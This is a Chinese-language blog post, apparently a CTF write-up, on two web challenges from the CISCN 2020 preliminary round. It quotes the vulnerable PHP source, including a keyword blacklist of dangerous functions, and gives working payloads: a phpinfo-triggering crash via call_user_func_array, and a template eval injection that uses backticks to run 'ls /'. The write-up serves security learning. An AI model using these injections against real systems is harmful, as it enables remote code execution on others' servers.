@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN全国大学生信息安全竞赛初赛">
+<meta property="og:url" content="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/index.html">
+<meta property="og:site_name" content="be a J0K1R">
+<meta property="og:description" content="前言">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/9.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/10.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/11.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/12.png">
+<meta property="og:image" content="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/13.png">
+<meta property="article:published_time" content="2020-08-21T15:09:56.000Z">
+<meta property="article:modified_time" content="2020-08-27T14:24:05.010Z">
+<meta property="article:author" content="Peguin">
+<meta property="article:tag" content="CISCN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/1.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>CISCN全国大学生信息安全竞赛初赛 | be a J0K1R</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="be a J0K1R" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">be a J0K1R</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="Peguin">
+      <meta itemprop="description" content="敢于去想，才会有MEteor的光芒闪耀。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="be a J0K1R">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CISCN全国大学生信息安全竞赛初赛
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-08-21 23:09:56" itemprop="dateCreated datePublished" datetime="2020-08-21T23:09:56+08:00">2020-08-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-08-27 22:24:05" itemprop="dateModified" datetime="2020-08-27T22:24:05+08:00">2020-08-27</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言<a id="more"></a></h2><p>这次比赛赛后感慨颇多，突然发现也有成长，不像之前一样没输出了，当时没做出的一道WEB复现发现真的很简单，还是平时一些简单的点没有太过重视，也是一次警醒，下面来看看题</p>
+<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>call_user_func_array函数</li>
+<li>php异常退出</li>
+</ul>
+<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开容器，直接给源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'could not fork'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])&amp;&amp;is_string($_GET[<span class="string">'a'</span>])&amp;&amp;!preg_match(<span class="string">"/[:\\\\]|exec|pcntl/i"</span>,$_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">'a'</span>],[$_GET[<span class="string">'b'</span>],<span class="keyword">false</span>,<span class="keyword">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>审计代码，会发现能利用的点就是<code>call_user_func_array</code>函数，会发现这里有四个两个参数，第二个参数是一个数组，google一下可以找到一个整理了php的bug的网站，找到了一篇文章<a href="https://bugs.php.net/bug.php?id=79982，文章里提到了一种异常退出的方法" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=79982，文章里提到了一种异常退出的方法</a></p>
+<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/1.png" class="">
+
+<p>刚好这道题要让程序异常退出，就会进入到phpinfo()</p>
+<p>根据文章里的poc，我们利用<code>stream_socket_client</code>函数来触发报错，得到<code>phpinfo()</code></p>
+<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/2.png" class="">
+
+<p>开始拿到这个页面不知道有什么用，看来一下<code>disable_function</code>,都可以用，加上这题很快被打穿，应该没那么难，搜索一下<code>flag{</code>,直接找到了</p>
+<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/3.png" class="">
+
+<h2 id="RCEME"><a href="#RCEME" class="headerlink" title="RCEME"></a>RCEME</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>命令执行</li>
+<li>反引号</li>
+<li>php输出方法</li>
+</ul>
+<h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">parserIfLabel($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">danger_key</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $s=htmlspecialchars($s);</span><br><span class="line">    $key=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'preg'</span>,<span class="string">'server'</span>,<span class="string">'chr'</span>,<span class="string">'decode'</span>,<span class="string">'html'</span>,<span class="string">'md5'</span>,<span class="string">'post'</span>,<span class="string">'get'</span>,<span class="string">'request'</span>,<span class="string">'file'</span>,<span class="string">'cookie'</span>,<span class="string">'session'</span>,<span class="string">'sql'</span>,<span class="string">'mkdir'</span>,<span class="string">'copy'</span>,<span class="string">'fwrite'</span>,<span class="string">'del'</span>,<span class="string">'encrypt'</span>,<span class="string">'$'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell'</span>,<span class="string">'open'</span>,<span class="string">'ini_'</span>,<span class="string">'chroot'</span>,<span class="string">'eval'</span>,<span class="string">'passthru'</span>,<span class="string">'include'</span>,<span class="string">'require'</span>,<span class="string">'assert'</span>,<span class="string">'union'</span>,<span class="string">'create'</span>,<span class="string">'func'</span>,<span class="string">'symlink'</span>,<span class="string">'sleep'</span>,<span class="string">'ord'</span>,<span class="string">'str'</span>,<span class="string">'source'</span>,<span class="string">'rev'</span>,<span class="string">'base_convert'</span>);</span><br><span class="line">    $s = str_ireplace($key,<span class="string">"*"</span>,$s);</span><br><span class="line">    $danger=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'preg'</span>,<span class="string">'server'</span>,<span class="string">'chr'</span>,<span class="string">'decode'</span>,<span class="string">'html'</span>,<span class="string">'md5'</span>,<span class="string">'post'</span>,<span class="string">'get'</span>,<span class="string">'request'</span>,<span class="string">'file'</span>,<span class="string">'cookie'</span>,<span class="string">'session'</span>,<span class="string">'sql'</span>,<span class="string">'mkdir'</span>,<span class="string">'copy'</span>,<span class="string">'fwrite'</span>,<span class="string">'del'</span>,<span class="string">'encrypt'</span>,<span class="string">'$'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell'</span>,<span class="string">'open'</span>,<span class="string">'ini_'</span>,<span class="string">'chroot'</span>,<span class="string">'eval'</span>,<span class="string">'passthru'</span>,<span class="string">'include'</span>,<span class="string">'require'</span>,<span class="string">'assert'</span>,<span class="string">'union'</span>,<span class="string">'create'</span>,<span class="string">'func'</span>,<span class="string">'symlink'</span>,<span class="string">'sleep'</span>,<span class="string">'ord'</span>,<span class="string">'str'</span>,<span class="string">'source'</span>,<span class="string">'rev'</span>,<span class="string">'base_convert'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($danger <span class="keyword">as</span> $val)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($s,$val) !==<span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'很抱歉，执行出错，发现危险字符【'</span>.$val.<span class="string">'】'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/^[a-z]$/i"</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'很抱歉，执行出错，发现危险字符'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span><span class="params">( $content )</span> </span>&#123;</span><br><span class="line">    $pattern = <span class="string">'/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/'</span>;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match_all( $pattern, $content, $matches ) ) &#123;</span><br><span class="line">        $count = count( $matches[ <span class="number">0</span> ] );</span><br><span class="line">        <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">            $flag = <span class="string">''</span>;</span><br><span class="line">            $out_html = <span class="string">''</span>;</span><br><span class="line">            $ifstr = $matches[ <span class="number">1</span> ][ $i ];</span><br><span class="line">            $ifstr=danger_key($ifstr,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos($ifstr,<span class="string">'='</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">                $arr= splits($ifstr,<span class="string">'='</span>);</span><br><span class="line">                <span class="keyword">if</span>($arr[<span class="number">0</span>]==<span class="string">''</span> || $arr[<span class="number">1</span>]==<span class="string">''</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'很抱歉，模板中有错误的判断,请修正【'</span>.$ifstr.<span class="string">'】'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $ifstr = str_replace( <span class="string">'='</span>, <span class="string">'=='</span>, $ifstr );</span><br><span class="line">            &#125;</span><br><span class="line">            $ifstr = str_replace( <span class="string">'&lt;&gt;'</span>, <span class="string">'!='</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'or'</span>, <span class="string">'||'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'and'</span>, <span class="string">'&amp;&amp;'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'mod'</span>, <span class="string">'%'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'not'</span>, <span class="string">'!'</span>, $ifstr );</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">'/\&#123;|&#125;/'</span>, $ifstr)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'很抱歉，模板中有错误的判断,请修正'</span>.$ifstr);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>( <span class="string">'if('</span> . $ifstr . <span class="string">')&#123;$flag="if";&#125;else&#123;$flag="else";&#125;'</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">'/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/'</span>, $matches[ <span class="number">2</span> ][ $i ], $matches2 ) ) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ( $flag ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'if'</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">1</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">1</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'else'</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">2</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">2</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( $flag == <span class="string">'if'</span> ) &#123;</span><br><span class="line">                $out_html .= $matches[ <span class="number">2</span> ][ $i ];</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern2 = <span class="string">'/\&#123;if([0-9]):/'</span>;</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123;</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;if'</span> . $matches3[ <span class="number">1</span> ], <span class="string">'&#123;if'</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;else'</span> . $matches3[ <span class="number">1</span> ] . <span class="string">'&#125;'</span>, <span class="string">'&#123;else&#125;'</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;end if'</span> . $matches3[ <span class="number">1</span> ] . <span class="string">'&#125;'</span>, <span class="string">'&#123;end if&#125;'</span>, $out_html );</span><br><span class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel( $out_html );</span><br><span class="line">            &#125;</span><br><span class="line">            $content = str_replace( $matches[ <span class="number">0</span> ][ $i ], $out_html, $content );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splits</span><span class="params">( $s, $str=<span class="string">','</span> )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>( $s ) ) <span class="keyword">return</span> <span class="keyword">array</span>( <span class="string">''</span> );</span><br><span class="line">    <span class="keyword">if</span> ( strpos( $s, $str ) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> explode( $str, $s );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>( $s );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了很多命令执行函数</p>
+<p>由于不了解parserIfLabel的用法，在google的时候找到了一样的源码和poc，是一个cve的部分内容</p>
+<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/4.png" class="">
+
+<p>这个GitHub地址给了poc但是打不通，稍微和原题有区别<a href="https://github.com/Tardis07/CVE_GO/blob/master/zzzphp_code_execution_v1.7.3.md" target="_blank" rel="noopener">https://github.com/Tardis07/CVE_GO/blob/master/zzzphp_code_execution_v1.7.3.md</a></p>
+<p>后来又找到了另一篇blog，本质无区别<a href="https://blog.csdn.net/CSDNPM250/article/details/104211233" target="_blank" rel="noopener">https://blog.csdn.net/CSDNPM250/article/details/104211233</a></p>
+<p>总的来说拿到手的poc形式就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;&#123;if:1)echo(phpinfo());&#x2F;&#x2F;&#125;&#123;end%20if&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里在本次测试可以发现php是被过滤了的，大小写双写都是无法绕过的</p>
+<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/5.png" class="">
+
+<p>这里就要想想还有什么方法能够拿到回显，突然想到我可以避开phpinfo拿回显啊，这几篇blog产生了误导，死活要拿phpinfo的回显</p>
+<p>直接用echo 打印目录好像也可以，再加上反引号没有被过滤，反引号的作用相当于命令执行函数，命令执行函数在白盒中被ban完了，但是反引号更好用，反引号相当于命令执行函数并且能把执行结果返回</p>
+<p>由于容器关了就给poc吧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;&#123;if:1)echo(&#96;ls &#x2F;&#96;);&#x2F;&#x2F;&#125;&#123;end%20if&#125;</span><br></pre></td></tr></table></figure>
